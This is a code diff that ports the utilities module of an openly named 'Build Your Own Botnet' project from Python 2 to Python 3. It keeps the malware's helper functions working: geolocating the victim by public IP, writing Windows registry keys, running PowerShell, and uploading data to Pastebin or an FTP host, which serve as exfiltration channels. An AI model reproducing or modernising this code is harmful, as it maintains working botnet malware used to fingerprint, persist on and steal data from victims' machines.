@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 'Utilities (Build Your Own Botnet)'
-from __future__ import print_function
+# from __future__ import print_function - Not needed in Python 3
 
 import colorama
 colorama.init()
@@ -77,11 +77,8 @@ def public_ip():
 
     """
     import sys
-    if sys.version_info[0] > 2:
-        from urllib.request import urlopen
-    else:
-        from urllib import urlopen
-    return urlopen('http://api.ipify.org').read()
+    from urllib.request import urlopen
+    return urlopen('http://api.ipify.org').read().decode('utf-8')
 
 
 def local_ip():
@@ -145,11 +142,8 @@ def geolocation():
     """
     import sys
     import json
-    if sys.version_info[0] > 2:
-        from urllib.request import urlopen
-    else:
-        from urllib2 import urlopen
-    response = urlopen('http://ipinfo.io').read()
+    from urllib.request import urlopen
+    response = urlopen('http://ipinfo.io').read().decode('utf-8')
     json_data = json.loads(response)
     latitude, longitude = json_data.get('loc').split(',')
     return (latitude, longitude)
@@ -230,12 +224,9 @@ def post(url, headers={}, data={}, json={}, as_json=False):
         return output
     except ImportError:
         import sys
-        if sys.version_info[0] > 2:
-            from urllib.request import urlopen,urlencode,Request
-        else:
-            from urllib import urlencode
-            from urllib2 import urlopen,Request
-        data = urlencode(data)
+        from urllib.request import urlopen, Request
+        from urllib.parse import urlencode
+        data = urlencode(data).encode('utf-8')
         req  = Request(str(url), data=data)
         for key, value in headers.items():
             req.headers[key] = value
@@ -282,10 +273,10 @@ def registry_key(key, subkey, value):
 
     """
     try:
-        import _winreg
-        reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, key, 0, _winreg.KEY_WRITE)
-        _winreg.SetValueEx(reg_key, subkey, 0, _winreg.REG_SZ, value)
-        _winreg.CloseKey(reg_key)
+        import winreg
+        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(reg_key, subkey, 0, winreg.REG_SZ, value)
+        winreg.CloseKey(reg_key)
         return True
     except Exception as e:
         log(e)
@@ -306,11 +297,7 @@ def png(image):
     import zlib
     import numpy
     import struct
-
-    try:
-        from StringIO import StringIO  # Python 2
-    except ImportError:
-        from io import StringIO        # Python 3
+    from io import BytesIO
 
     if isinstance(image, numpy.ndarray):
         width, height = (image.shape[1], image.shape[0])
@@ -339,16 +326,13 @@ def png(image):
     iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
     iend[0] = struct.pack('>I', len(iend[2]))
 
-    fileh = StringIO()
-    fileh.write(str(magic))
-    fileh.write(str(b"".join(ihdr)))
-    fileh.write(str(b"".join(idat)))
-    fileh.write(str(b"".join(iend)))
+    fileh = BytesIO()
+    fileh.write(magic)
+    fileh.write(b"".join(ihdr))
+    fileh.write(b"".join(idat))
+    fileh.write(b"".join(iend))
     fileh.seek(0)
-    output = fileh.getvalue()
-    if sys.version_info[0] > 2:
-        output = output.encode('utf-8') # python3 compatibility
-    return output
+    return fileh.getvalue()
 
 
 def delete(target):
@@ -422,7 +406,7 @@ def powershell(code):
         log("{} error: {}".format(powershell.__name__, str(e)))
 
 
-def display(output, color=None, style=None, end='\\n', event=None, lock=None):
+def display(output, color=None, style=None, end='\n', event=None, lock=None):
     """
     Display output in the console
 
@@ -447,7 +431,7 @@ def display(output, color=None, style=None, end='\\n', event=None, lock=None):
     _style = ''
     if style:
         _style = getattr(colorama.Style, style.upper())
-    exec("""print(_color + _style + output + colorama.Style.RESET_ALL, end="{}")""".format(end))
+    print(_color + _style + output + colorama.Style.RESET_ALL, end=end)
 
 
 def color():
@@ -488,12 +472,8 @@ def pastebin(source, api_key):
 
     """
     import sys
-    if sys.version_info[0] > 2:
-        from urllib.parse import urlsplit,urlunsplit
-    else:
-        from urllib2 import urlparse
-        urlsplit = urlparse.urlsplit
-        urlunsplit = urlparse.urlunsplit
+    from urllib.parse import urlsplit, urlunsplit
+    
     if isinstance(api_key, str):
         try:
             info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
@@ -526,11 +506,7 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
     import os
     import time
     import ftplib
-
-    try:
-        from StringIO import StringIO  # Python 2
-    except ImportError:
-        from io import StringIO        # Python 3
+    from io import StringIO, BytesIO
 
     if host and user and password:
         path  = ''
@@ -541,7 +517,10 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
         elif hasattr(source, 'seek'):
             source.seek(0)
         else:
-            source = StringIO(source)
+            if isinstance(source, bytes):
+                source = BytesIO(source)
+            else:
+                source = StringIO(source)
         try:
             ftp = ftplib.FTP(host=host, user=user, password=password)
         except:
